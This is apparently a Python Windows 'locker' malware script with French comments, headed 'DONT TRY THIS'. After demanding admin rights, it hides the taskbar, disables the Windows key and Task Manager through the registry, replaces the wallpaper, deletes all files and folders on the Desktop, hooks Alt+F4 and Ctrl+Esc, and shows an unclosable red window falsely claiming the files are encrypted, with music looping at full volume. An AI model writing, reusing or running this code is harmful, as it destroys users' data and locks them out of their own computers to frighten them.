#### DONT TRY THIS

import ctypes
import os
import tkinter as tk
from tkinter import messagebox
import winreg
import win32gui
import win32con
import win32api
import win32process
import time
import shutil
import sys
import threading
from pynput import keyboard

import pygame

def play_music_loop():
    pygame.mixer.init()
    pygame.mixer.music.load("music.mp3")
    pygame.mixer.music.set_volume(1.0)  # Volume max
    pygame.mixer.music.play(-1)  # -1 pour boucle infinie
    
    # On bloque le thread pour pas que ça se coupe
    try:
        while True:
            pygame.time.Clock().tick(10)
    except KeyboardInterrupt:
        pass  # Pour éviter la fermeture avec Ctrl+C dans la console

#<<


def show_final_window(main_text="Votre ordinateur est vérouillé !", description="Tous vos fichiers ont étés encryptés."):
    root = tk.Tk()
    root.overrideredirect(True)  # Pas de barre de tache ni bordure
    root.attributes("-topmost", True)
    root.configure(bg="red")
    
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    window_width, window_height = 600, 300
    x = (screen_width - window_width) // 2
    y = (screen_height - window_height) // 2
    root.geometry(f"{window_width}x{window_height}+{x}+{y}")

    # Texte principal énorme et noir
    main_label = tk.Label(root, text=main_text, font=("Arial", 48, "bold"), fg="black", bg="red")
    main_label.pack(pady=(40, 10))

    # Description en dessous
    desc_label = tk.Label(root, text=description, font=("Arial", 20), fg="black", bg="red")
    desc_label.pack()

    # Interdire fermeture
    def disable_event():
        pass
    root.protocol("WM_DELETE_WINDOW", disable_event)

    root.mainloop()



#>>

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def show_message(title, message, borderless=False):
    root = tk.Tk()
    if borderless:
        root.overrideredirect(True)
        root.attributes("-topmost", True)
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        window_width, window_height = 200, 100
        x = (screen_width - window_width) // 2
        y = (screen_height - window_height) // 2
        root.geometry(f"{window_width}x{window_height}+{x}+{y}")
        label = tk.Label(root, text=message, font=("Arial", 14))
        label.pack(expand=True)
    else:
        root.withdraw()
        messagebox.showwarning(title, message)
    return root

def hide_taskbar():
    try:
        hwnd = win32gui.FindWindow("Shell_TrayWnd", None)
        if hwnd:
            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Erreur lors de la dissimulation de la barre des tâches : {e}")

def disable_task_manager():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        except FileNotFoundError:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        win32gui.PostMessage(win32con.HWND_BROADCAST, win32con.WM_SETTINGCHANGE, 0, 0)
    except Exception as e:
        print(f"Erreur lors de la désactivation du gestionnaire des tâches : {e}")

def set_wallpaper(image_path):
    try:
        full_path = os.path.abspath(image_path)
        if os.path.exists(full_path):
            ctypes.windll.user32.SystemParametersInfoW(20, 0, full_path, 3)
    except Exception as e:
        print(f"Erreur lors du changement du fond d'écran : {e}")

def clear_desktop_icons():
    try:
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        for item in os.listdir(desktop_path):
            item_path = os.path.join(desktop_path, item)
            try:
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
            except Exception as e:
                print(f"Erreur lors de la suppression de {item_path} : {e}")
    except Exception as e:
        print(f"Erreur lors du nettoyage du bureau : {e}")

def keyboard_hook():
    pressed_keys = set()  # Suivi des touches enfoncées

    def on_press(key):
        try:
            # Ajouter la touche au set
            pressed_keys.add(key)
            
            # Vérifier Alt+F4
            if (key == keyboard.Key.f4 and 
                (keyboard.Key.alt in pressed_keys or 
                 keyboard.Key.alt_l in pressed_keys or 
                 keyboard.Key.alt_r in pressed_keys)):
                return False  # Bloquer la touche F4 si Alt est enfoncé
            
            # Vérifier Ctrl+Esc
            if (key == keyboard.Key.esc and 
                (keyboard.Key.ctrl in pressed_keys or 
                 keyboard.Key.ctrl_l in pressed_keys or 
                 keyboard.Key.ctrl_r in pressed_keys)):
                return False  # Bloquer la touche Esc si Ctrl est enfoncé
                
        except Exception as e:
            print(f"Erreur dans le hook clavier (press) : {e}")
        return True  # Laisser passer les autres touches

    def on_release(key):
        try:
            # Retirer la touche du set
            if key in pressed_keys:
                pressed_keys.remove(key)
        except Exception as e:
            print(f"Erreur dans le hook clavier (release) : {e}")
    
    # Démarrer le listener dans un thread séparé
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    return listener

def main():
    if not is_admin():
        show_message("Erreur", "Veuillez exécuter ce programme en mode administrateur.", borderless=False)
        sys.exit(1)
    
    loading_window = show_message("Chargement", "Loading...", borderless=True)
    
    # Démarrer le hook clavier
    listener = keyboard_hook()
    
    # Effectuer les actions de verrouillage
    hide_taskbar()
    disable_task_manager()
    set_wallpaper("photo.jpeg")
    clear_desktop_icons()
    show_final_window()
    play_music_loop()
    
    # Fermer la fenêtre et arrêter le listener après 5 secondes
    loading_window.after(5000, lambda: [loading_window.destroy(), listener.stop()])
    loading_window.mainloop()

if __name__ == "__main__":
    main()
